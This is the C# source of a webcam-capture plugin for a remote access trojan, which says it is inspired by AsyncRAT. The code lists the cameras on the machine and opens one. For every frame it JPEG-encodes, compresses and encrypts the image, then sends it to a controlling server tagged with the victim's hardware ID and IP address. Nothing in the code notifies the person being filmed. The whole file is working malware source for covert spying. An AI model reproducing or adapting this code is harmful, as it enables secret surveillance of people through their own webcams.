using AForge.Video;
using AForge.Video.DirectShow;
using Shared;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Text;
using System.Threading;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    //Inspired by Async Rat
    public static class Functions
    {
        internal static Client C;
        internal static bool hasToCapture = false;
        private static VideoCaptureDevice FinalVideo;
        private static MemoryStream Camstream = new MemoryStream();
        internal static int Quality = 50;
        internal static int Index = 0;

        internal static List<string> GetCameras() 
        {
           List<string> CameraList = new List<string>();
           FilterInfoCollection videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            foreach (FilterInfo videoCaptureDevice in videoCaptureDevices)
            {
                CameraList.Add(videoCaptureDevice.Name);
            }
            return CameraList;
        }

        public static void Capture(int index, int quality, Host H, string HWID, string key, string BaseIP) 
        {
            Index = index;
            Quality = quality;
            FilterInfoCollection videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            FinalVideo = new VideoCaptureDevice(videoCaptureDevices[Index].MonikerString);
            FinalVideo.NewFrame += new NewFrameEventHandler
                (
                 (sender, e) => CaptureRun(sender, e, H , HWID, key, BaseIP)
                ); 
            FinalVideo.VideoResolution = FinalVideo.VideoCapabilities[Index];
            FinalVideo.Start();
        }

        public static void CaptureRun(object sender, NewFrameEventArgs e, Host H, string HWID, string key, string BaseIP)
        {
            try
            {
                if (hasToCapture == true)
                {
                    Bitmap image = (Bitmap)e.Frame.Clone();
                    using (Camstream = new MemoryStream())
                    {
                        System.Drawing.Imaging.Encoder myEncoder = System.Drawing.Imaging.Encoder.Quality;
                        EncoderParameters myEncoderParameters = new EncoderParameters(1);
                        EncoderParameter myEncoderParameter = new EncoderParameter(myEncoder, Quality);
                        myEncoderParameters.Param[0] = myEncoderParameter;
                        ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
                        image.Save(Camstream, jpgEncoder, myEncoderParameters);
                        myEncoderParameters?.Dispose();
                        myEncoderParameter?.Dispose();
                        image?.Dispose();

                        byte[] compressed = Shared.Compressor.QuickLZ.Compress(Camstream.ToArray(), 1);
                        Data D = new Data();
                        D.HWID = HWID;
                        D.Type = PacketType.CAPTURE_CAMERA;
                        D.DataReturn = new object[] { compressed };
                        D.IP_Origin = BaseIP;
                        SendData(C.S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key)));
                        Thread.Sleep(1);
                    }
                }
                else
                {
                    new Thread(() =>
                    {
                        try
                        {           
                            Stop(H, HWID, key, BaseIP);
                        }
                        catch { }
                    }).Start();
                }
            }
            catch (Exception)
            {
                new Thread(() =>
                {
                    try
                    {
                        Stop(H, HWID, key, BaseIP);
                    }
                    catch { }
                }).Start();
            }      
        }

        public static void Stop(Host H, string HWID, string key, string BaseIP)
        {
            try
            {
                hasToCapture = false;
                FinalVideo.Stop();
                FinalVideo.NewFrame -= null;
                Camstream?.Dispose();
                C.CloseClient();
            }
            catch {}
        }
        private static ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }
    }
}
